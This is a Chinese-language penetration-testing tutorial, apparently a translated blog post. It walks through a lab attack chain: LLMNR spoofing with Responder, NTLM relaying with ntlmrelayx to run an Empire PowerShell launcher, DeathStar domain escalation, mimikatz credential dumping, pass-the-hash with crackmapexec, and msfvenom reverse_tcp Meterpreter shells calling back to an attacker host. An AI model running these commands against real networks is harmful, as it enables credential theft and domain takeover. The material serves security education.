**本文将会用到的工具：**

> [Responder](https://github.com/SpiderLabs/Responder)
>
> [Empire](https://github.com/EmpireProject/Empire)
>
> [Deathstar](https://github.com/byt3bl33d3r/DeathStar)
>
> [Ntlmrelayx.py](https://github.com/CoreSecurity/impacket)
> （[安装过程可以参考这里](https://hausec.com/how-to-set-up-ntlmrelayx-py/)）

 **操作系统**

 **主机：** Ubuntu 16.04，Kali Linux（最新版）

 **目标1：** Windows Server 2008 R2（虚拟服务器）

 **目标2：** Windows Server 2008 R2（域控制器）

当进行域渗透的时候，我们往往需要通过某种方式来获取NTLMv2的哈希。但我们不难发现，NTLMv2的哈希并不像普通的NTLM哈希可以被直接传递，因此如果你没有一个超级强大的字典，你将很难获取到正确的访问凭据。那么，真的就没有其它办法了吗？其实，我们还可以通过一种中继的方式来中继获取的用户名和哈希。此外，如果捕获的凭据具有访问Windows
server共享权限的话，则还可能导致远程代码执行。

在正式开始之前，我需要说明一些情况。

>   1.
> Deathstar的使用我会在Ubuntu上，因为截至本文发布[Deathstar无法正常与当前版本的Kali一起工作](https://github.com/byt3bl33d3r/DeathStar/issues/28)，python
> requests不支持任何1.2的TLS版本。
>   2. 其次，我们假定正在中继机器的SMB签名是禁用状态的。Deathstar需要Empire
> agent才能工作，它会自动化的为我们完成后续的所有操作（不需要NTLM中继）。
>   3. 本文演示均在实验环境下进行，并非真实网络环境。该演示主要是模拟，可能发生的LLMNR欺骗并捕获域管理员凭据的情况。关于Deathstar &
> Crackmapexec能为我们做什么，需要你阅读更多[相关的技术资料](https://github.com/byt3bl33d3r/DeathStar)。
>

现在让我们开始吧！

首先我在一个终端上启动Empire的RESTful API。

    
    
    sudo python empire --rest --username empireadmin --password Password123

然后我在另一个终端启动Deathstar。

    
    
    sudo ./DeathStar.py --listener-ip 192.168.232.133 -t 100

![1ds1.png](https://image.3001.net/images/20180120/1516414249824.png!small)  

Listener IP将是任何Empire正在侦听的IP。-t 100表示我给它100个线程运行，所以速度更快。

接下来，我要从Empire生成powershell脚本。键入到Empire的listener模块

    
    
    Listeners

![2ds2.png](https://image.3001.net/images/20180120/15164142675764.png!small)  

通过以下命令创建payload

    
    
    launcher powershell Deathstar

![3ds3.png](https://image.3001.net/images/20180120/15164142876187.png!small)  

复制powershell脚本，一会儿你需要粘贴它。

接下来，我设置了ntlmrelayx.py（[NTLMRelayx.py设置可以参考这里](https://hausec.com/how-to-set-up-ntlmrelayx-py/)）

    
    
    sudo ntlmrelayx.py -t 192.168.232.100 -c 'powershell -noP -sta -w 1 -enc  [powershell code]’

![4ds4.png](https://image.3001.net/images/20180120/15164143068954.png!small)  

ntlmrelayx.py也支持-tf开关的文件（例如target.txt），所以你可以同时放入多个目标。注意，powershell脚本必须在引号中，否则将不会运行。

接下来，编辑Responder库中的Responder.conf文件并关闭SMB和HTTP

![5ds5.png](https://image.3001.net/images/20180120/15164143298949.png!small)  

最后启动Responder

    
    
    sudo python Responder.py -I ens33 -r -d –v

![6ds6.png](https://image.3001.net/images/20180120/1516414347691.png!small)  

一切设置无误后，最后你的屏幕看起来应该像这样

![7ds7.png](https://image.3001.net/images/20180120/15164143675228.png!small)  

接下来，使用我的Windows机器，模拟域管理员输入一个共享，生成一个LLMNR请求。

![8ds8.png](https://image.3001.net/images/20180120/15164145467903.png!small)  

毒化回应然后通过Responder发送

![9ds9.png](https://image.3001.net/images/20180120/15164145678628.png!small)  

NTLMv2哈希凭据被中继

![10ds10.png](https://image.3001.net/images/20180120/15164145863092.png!small)  

Empire agent打开

![11ds11.png](https://image.3001.net/images/20180120/15164146074209.png!small)  

Deathstar开始自动化渗透过程

![12ds12.png](https://image.3001.net/images/20180120/15164146306376.png!small)  

在该演示中，Deathstar花了大约5分钟的时间来找到域控制器，及活跃用户，然后在域控上生成了另一个Empire agent。

![13ds13.png](https://image.3001.net/images/20180120/15164146585071.png!small)  

一个Empire agent正运行在DC上

![14ds14.png](https://image.3001.net/images/20180120/15164146811826.png!small)  

最后一步是获取到一个shell。

有很多方法可以帮我们做到这一点

  1. 上传一个.exe格式的meterpreter payload，并通过shell命令执行
  2. 使用mimikatz获取服务器上的凭据，并使用crackmapexec传递散列打开meterpreter session
  3. 使用Empire的Invoke-Shellcode模块
  4. 更多

##  **使用Mimikatz & Crackmapexec开启Meterpreter Shell**

首先是与agent交互。始终使用SYSTEM权限的agent。虽然“god”是域管理员，SYSTEM仍是一个很高的用户权限。

    
    
    interact [agent name]

![15ds15.png](https://image.3001.net/images/20180120/15164147098807.png!small)  

然后启动mimikatz

    
    
    mimikatz

![16ds16.png](https://image.3001.net/images/20180120/15164152307297.png!small)  

大概一分钟后，你会看到大量打印信息。我们直接忽略这些内容按回车，并键入以下命令

    
    
    creds

此时，你将会获取到一个排列整齐的表格数据

![17ds17.png](https://image.3001.net/images/20180120/15164152588487.png!small)  

如你所看到的，我们获取到了域管理员的哈希和明文密码。这里，我们可以使用crackmapexec打开一个反向shell。

首先，我们设置下multi/handler

![18ds18.png](https://image.3001.net/images/20180120/15164152909933.png!small)  

然后运行crackmapexec。 虽然我已经有了明文密码，但这里我为大家演示依然可以通过PTH攻击。

    
    
    crackmapexec 192.168.232.100 -u god -H 7314885dc066c5fd98e6ae96832fa905 -M metinject -o LHOST=192.168.232.136 LPORT=4443

##
**![19ds19.png](https://image.3001.net/images/20180120/15164153247932.png!small)  
**

##
![20ds20.png](https://image.3001.net/images/20180120/15164153555157.png!small)  

##
**![21ds21.png](https://image.3001.net/images/20180120/15164153765599.png!small)  
**

##  **通过Empire上传一个** **Meterpreter Payload**

首先，我们创建一个Meterpreter payload

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.232.136 LPORT=4443 -f exe > shell.exe

![22ds22.png](https://image.3001.net/images/20180120/15164154015864.png!small)  

复制.exe到Empire目录

![23ds23.png](https://image.3001.net/images/20180120/15164154292355.png!small)  

与Empire agent交互

    
    
    interact [Agent name]

上传可执行的.exe

![24ds24.png](https://image.3001.net/images/20180120/15164154646658.png!small)  

得到shell

![25ds25.png](https://image.3001.net/images/20180120/1516415488632.png!small)  

除了以上介绍的两种方法之外，其实还有许多其他的方法。虽然以上提供的方法不是最隐蔽和最值得推荐的，但却是最简单和实用的。

更多关于Deathstar & Crackmapexec的实用指南，请通过以下链接了解：

<https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html>

 ***参考来源：[hausec](https://hausec.com/2017/10/25/automating-the-pentesting-process-how-llmnr-spoofing-can-lead-to-domain-admin-in-5-minutes/)，FB小编 secist
编译，转载请注明来自FreeBuf.COM**  

